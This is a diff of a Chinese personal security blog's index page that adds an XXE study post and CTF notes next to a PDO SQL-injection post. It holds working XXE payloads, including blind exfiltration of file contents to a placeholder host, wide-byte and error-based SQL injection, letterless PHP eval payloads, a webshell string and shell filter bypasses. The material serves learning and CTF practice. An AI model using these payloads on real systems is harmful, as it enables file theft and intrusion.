@@ -160,6 +160,137 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XXE专题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/30/XXE专题/">XML学习</a>
+    </h1>
+  
+
+        
+        <a href="/2020/06/30/XXE专题/" class="archive-article-date">
+  	<time datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE学习记录"><a href="#XXE学习记录" class="headerlink" title="XXE学习记录"></a>XXE学习记录</h1><p>​    </p>
+<p>​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。</p>
+<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： <code>&lt;!DOCTYPE 根元素名 [element-declarations]&gt;</code>，如果DTD位于XML源文件外，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这个SYSTEM/PUBLIC关键字就是导致XXE注入的关键，经过研究JAVA解析DTD文件时，通过文件流将SYSTEM关键字后面的值当作URL读取文件，而JAVA文件流支持HTTP、FTP、JAR、FILE等等协议，在PHP中情况也类似，支持PHP伪协议、phar等等协议。</p>
+<p>​    在DTD中可以定义通用实体和参数实体。</p>
+<p>​    1、通用实体</p>
+<p>​    通用实体能在XML文档中引用，示例代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    2、参数实体</p>
+<p>​    参数实体只能在DTD文件中引用，示例代码如下：</p>
+<p>test1.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;</span><br><span class="line">%in1;%out;</span><br></pre></td></tr></table></figure>
+
+<p>test2.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    关于DTD的基本知识就介绍到这里，接下来尝试一下XXE攻击，本文使用PHP环境。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>首先搭建一个简单的解析XML文档的PHP服务,目标是读取flag.php文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建文档对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 </span><br><span class="line">    $creds = simplexml_import_dom($dom);<span class="comment">//将DOM对象转换成XML对象</span></span><br><span class="line">    <span class="keyword">echo</span> $creds;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们这里主要探讨Data协议</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://i.loli.net/2020/07/02/XtAH16oLrYkhCTb.png" alt></p>
+<p>经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。</p>
+<p><img src="https://i.loli.net/2020/07/02/4rREZKu9dOz7JNv.png" alt></p>
+<p>直接拼凑失败了，SYSTEM后面的%xxe;直接被当成url解析了，于是尝试分步拼凑。</p>
+<p><img src="https://i.loli.net/2020/07/02/tBRa6jSh34fo9iZ.png" alt></p>
+<p>发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体，那就用外部DTD试试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;</span><br><span class="line">%out;%all;</span><br><span class="line"> ]&gt; </span><br><span class="line">&lt;root&gt;&amp;a;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>out.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>理一下思路，首先在在payload中完成data协议信息读取，然后再外部dtd进行拼凑，最后再引用拼凑的实体进行文件读取，这样可以绕过许多WAF。</p>
+<p><img src="https://i.loli.net/2020/07/02/n1PUFQfeqpm4SEk.png" alt></p>
+<p>顺带一提，当文件中含有&gt;,%,&amp;等字符时，XML解析会报错，不能读取出文件内容，这是可以用CDATA来包裹文件内容，再CDATA中的数据不会被XML解析，也需要用到外部dtd，这里就直接放关键部分payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。</p>
+<h2 id="本地DTD文件"><a href="#本地DTD文件" class="headerlink" title="本地DTD文件"></a>本地DTD文件</h2><p>在靶机不通外网的情况下，可以应用本地DTD文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu自带：/usr/share/yelp/dtd/docbookx.dtd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/3357#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-22</a> </p>
+<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a> </p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/XXE//" class="article-tag-list-link color4">XXE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/06/30/XXE专题/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PDO学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -187,15 +318,15 @@
 <h3 id="本地预处理"><a href="#本地预处理" class="headerlink" title="本地预处理"></a>本地预处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=pdotest"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="keyword">false</span>)</span><br><span class="line">$user=<span class="string">"lili"</span>;</span><br><span class="line">$sql=<span class="string">"select * from user where username=?"</span>;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">$st-&gt;bindParam(<span class="number">1</span>,$user);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>抓取流量包</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005214411675.png" alt="image-20201005214411675"></p>
+<p>![image-20201005214411675]/images/PDO学习/image-20201005214411675.png)</p>
 <p>发现在prepare时，会发送一个带有占位符的mysql预处理语句，在execute时，将绑定的参数发送给数据库。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005214731021.png" alt="image-20201005214731021"></p>
+<p>![image-20201005214731021]/images/PDO学习/image-20201005214731021.png)</p>
 <p>尝试一下sql注入</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006134328847.png" alt="image-20201006134328847"></p>
+<p>![image-20201006134328847]/images/PDO学习/image-20201006134328847.png)</p>
 <p>发送数据时未经过任何处理，但是得不到返回结果，查看mysql查询日志。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006134416919.png" alt="image-20201006134416919"></p>
+<p>![image-20201006134416919]/images/PDO学习/image-20201006134416919.png)</p>
 <p>看来在mysql本地的预处理，也会将数据转义，那么尝试一下宽字节注入，发现无法得到结果，查看日志</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006141225775.png" alt="image-20201006141225775"></p>
+<p>![image-20201006141225775]/images/PDO学习/image-20201006141225775.png)</p>
 <p>看来当编码设置为GBK时，mysql会将字符串转换成16进制，所以无法注入。</p>
 <p>当使用本地预处理时，能使用报错注入，而且只需要执行到prepare就能够将用户名，版本这些信息爆出来，前提是能够控制参数内容。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pdo=new PDO(&quot;mysql:host=localhost;dbname=pdotest&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">$user=&quot;lili&quot;;</span><br><span class="line">$pdo-&gt;setAttribute(pdo::ATTR_EMULATE_PREPARES, false);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,user()),0))&quot;;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -203,18 +334,18 @@
 <p>尝试爆出数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,(select * from user limit 1)),0))&quot;;</span><br></pre></td></tr></table></figure>
 
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006145729946.png" alt="image-20201006145729946"></p>
+<p>![image-20201006145729946]/images/PDO学习/image-20201006145729946.png)</p>
 <p>这里非常奇怪，因为需要执行到execute才会在流量包中返回错误，但是PDO并不会报错，去网上搜都说PDO不支持子查询，但我这里确实返回了报错，不解。</p>
 <h3 id="模拟预处理"><a href="#模拟预处理" class="headerlink" title="模拟预处理"></a>模拟预处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=pdotest"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">$user=<span class="string">"1' or 1=1 #"</span>;</span><br><span class="line">$sql=<span class="string">"select * from user where username=?"</span>;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">$st-&gt;bindParam(<span class="number">1</span>,$user);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>抓取流量包</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005211830170.png" alt="image-20201005211830170"></p>
+<p>![image-20201005211830170]/images/PDO学习/image-20201005211830170.png)</p>
 <p>发现字符串被转义了，这是因为使用bindParam时，会进行字符串转义操作，同<code>mysql_real_escape_string</code>。</p>
 <p>既然是转义，感觉也能进行宽字节注入。</p>
 <p>首先需要设置一下编码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(<span class="string">'SET NAMES GBK'</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005213001535.png" alt="image-20201005213001535"></p>
+<p>![image-20201005213001535]/images/PDO学习/image-20201005213001535.png)</p>
 <p>抓包发现成功返回结果，宽字节注入成功。</p>
 <p>pdo的mysql语句多行执行也是默认打开的，所以在可以控制参数前提下，能够使用多行来进行注入。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之，只要使用参数绑定，并设置本地预处理优先，基本上就完美防御了sql注入。</p>
@@ -663,6 +794,168 @@
 
 
   
+    <article id="post-ctf总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/ctf总结/">ctf</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/ctf总结/" class="archive-article-date">
+  	<time datetime="2019-09-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="md5常见绕过"><a href="#md5常见绕过" class="headerlink" title="md5常见绕过"></a>md5常见绕过</h2><h3 id="强比较绕过"><a href="#强比较绕过" class="headerlink" title="强比较绕过"></a>强比较绕过</h3><p>数组绕过</p>
+<p>​    md5碰到数组数据时返回null，null===nulll绕过。</p>
+<p>md5碰撞</p>
+<p>​    fastcoll</p>
+<h3 id="弱比较绕过"><a href="#弱比较绕过" class="headerlink" title="弱比较绕过"></a>弱比较绕过</h3><p>利用科学计数法0e+任何数字都为0。</p>
+<p>以下值在md5加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>以下值在sha1加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(‘aaroZmOk’)</span><br><span class="line">sha1(‘aaK1STfY’)</span><br><span class="line">sha1(‘aaO8zKZF’)</span><br><span class="line">sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure>
+
+<p>以下值加密前后弱比较相等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+
+<h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><h3 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload php5-php7.0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()<span class="comment">//$_=_GET</span></span><br></pre></td></tr></table></figure>
+
+<p>如果把下划线也ban了，还能使用不可见字符或者+或者中文来做变量名。</p>
+<p>php7.0之后BAN了assert，不过可以用取反来调用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();<span class="comment">//phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<p>值得一提的是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require。</p>
+<p>readfie(end(scandir(.)))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
+
+<h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>当preg_match处理数组时会返回flase。</p>
+<h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p>正则<code>.</code>不会匹配换行符</p>
+<p>在单行匹配下，<code>$</code>不会匹配\n或者\r。</p>
+<h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p><a href="https://security.bytedance.com/index/" target="_blank" rel="noopener">https://security.bytedance.com/index/</a> </p>
+<p>PHP的PCRE采用NFA正则引擎</p>
+<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 </p>
+<p>NFA引擎会设置一个最大回溯次数，如果超过这个次数就返回FLASE,所以我们可发送超长字符串，使正则返回失败。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux命令执行"><a href="#Linux命令执行" class="headerlink" title="Linux命令执行"></a>Linux命令执行</h2><p>参考文章<a href="https://blog.zeddyu.info/2019/01/17/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/</a> </p>
+<h3 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?匹配一个任意字符</span><br><span class="line">*匹配任意字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>$IFS分隔符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span><span class="variable">$9</span></span><br></pre></td></tr></table></figure>
+
+<p>IFS表示linux下的分隔符，但是直接使用$IFS会导致歧义，比如cat$IFSfile，这样bash会将整个IFSfile当成变量名，导致无法读取到file文件，通常我们用${IFS}来确定变量名，或者使用$IFS$9,$9为当前系统shell进程的第九个参数，默认为空，在这里起到一个隔断作用。</p>
+<p>花括号扩展<code>{OS_COMMAND,ARGUMENT}</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,file&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">'cat\x20flag'</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line">x=<span class="string">'cat\x09flag'</span>&amp;&amp;<span class="variable">$x</span></span><br></pre></td></tr></table></figure>
+
+<p>\x20和\x09分别表示空格与tab。</p>
+<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p>
+<p>windows中：<code>%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</code></p>
